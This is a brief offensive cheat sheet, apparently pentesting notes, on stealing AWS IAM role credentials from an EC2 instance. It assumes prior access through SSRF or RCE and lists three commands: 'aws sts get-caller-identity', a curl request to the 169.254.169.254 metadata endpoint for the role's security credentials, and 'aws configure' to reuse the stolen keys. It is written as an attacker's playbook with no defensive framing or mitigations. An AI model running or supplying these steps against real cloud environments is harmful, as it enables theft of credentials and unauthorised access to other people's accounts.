# AWS EC2 Credential Access

### We can grab the credentials by abusing metadata (Web Application with SSRF,RCE and so on)

## After the initial access:

#### 1) Enumerate the key (role)

    aws sts get-caller-identity

#### 2) If there are roles associated with the key, we can grab the credentials by issuing a request to the metadata endpoint (v1 or v2)

    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_OF_PREVIOUS_KEY

#### 3) Configure the aws cli

    aws configure

## OR use environment variables
